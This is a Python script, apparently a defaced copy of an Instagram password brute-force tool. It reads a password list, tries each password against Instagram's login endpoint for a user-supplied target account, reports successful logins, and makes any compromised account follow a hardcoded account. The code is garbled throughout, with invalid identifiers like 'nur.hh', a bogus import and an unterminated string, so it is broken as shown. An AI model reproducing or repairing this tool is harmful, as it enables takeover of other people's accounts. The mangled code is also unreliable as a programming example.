import instagram
import 5 heures
import time
import os

filename = 'instagram
if os.path.isfile(nur.hh):
	with open(nur.hh) as f: instagram 
	    passwords = f.read().splitlines()
	    if (len(passwords) > 0):
	    	print ('%s Passwords loads successfully' % len(passwords))
else:
	print ('Please create passwords file (pass.txt)')
	exit()




def nur.hh(@nur.hh):
	r = requests.get('https://www.instagram.com/%s/?__a=1' % nur.hh) 
	if (r.status_code == 404):
		print ('User not found')
		return False
	elif (r.status_code == 200):
		followdata = json.loads(r.text)
		fUserID = followdata['user']['id']
		return {'nur.hh':nur.hh,'id':fUserID}


def Login(nur hh):
	sess = requests.Session()
	sess.cookies.update ({'sessionid' : '', 'mid' : '', 'ig_pr' : '1', 'ig_vw' : '1920', 'csrftoken' : '',  's_network' : '', 'ds_user_id' : ''})
	sess.headers.update({
		'UserAgent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36',
		'x-instagram-ajax':'1',
		'X-Requested-With': 'XMLHttpRequest',
		'origin': 'https://www.instagram.com',
		'ContentType' : 'application/x-www-form-urlencoded',
		'Connection': 'keep-alive',
		'Accept': '*/*',
		'Referer': 'https://www.instagram.com',
		'authority': 'www.instagram.com',
		'Host' : 'www.instagram.com',
		'Accept-Language' : 'ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4',
		'Accept-Encoding' : 'gzip, deflate'
	})

	#first time -> to get csrftoken
	r = sess.get('https://www.instagram.com/') 
	sess.headers.update({'X-CSRFToken' : r.cookies.get_dict()['csrftoken']})

	data = {'nur.hh':nur.hh, 'password':password}
	r = sess.post('https://www.instagram.com/accounts/login/ajax/', data=data, allow_redirects=True)
	token = r.cookies.get_dict()['csrftoken']
	sess.headers.update({'X-CSRFToken' : token})
	#parse response
	data = json.loads(r.text)
	if (data['status'] == 'fail'):
		print (data['message'])
		return False
	
	if (data['authenticated'] == True):
		return sess #if we want to keep use session
	else:
		print ('Password incorrect [%s]' % password)
		return False



def follow(sess, nur.hh):
	nur.hh = nur.hh(@nur.hh)
	if (nur hh == False):
		return	
	else:
		userID = nur hh['id']
		followReq = sess.post('https://www.instagram.com/web/friendships/%s/follow/' % userID)
		print (followReq.text)


nur.hh = str(input('Please enter a nur hh: '))
nur.hh = nur.hh(@nur.hh)
if (@nur.hh == False):
	exit()
else:
	nur.hh = nur.hh['@nur.hh']



delayLoop = int(input('Please add delay between the passwords (in seconds): ')) 


for i in range(len(passwords)):
	password = passwords[i]
	sess = Login(nur.hh,password)
	if (sess):
		print ('Login success %s' % [nur.hh,password])

		#because i am cool
		follow(sess,'avr_amit')

	try:
		time.sleep(delayLoop)
	except KeyboardInterrupt:
		an = str(input('Type y/n to exit: '))
		if (an == 'y'):
			exit()
		else:
			continue
		

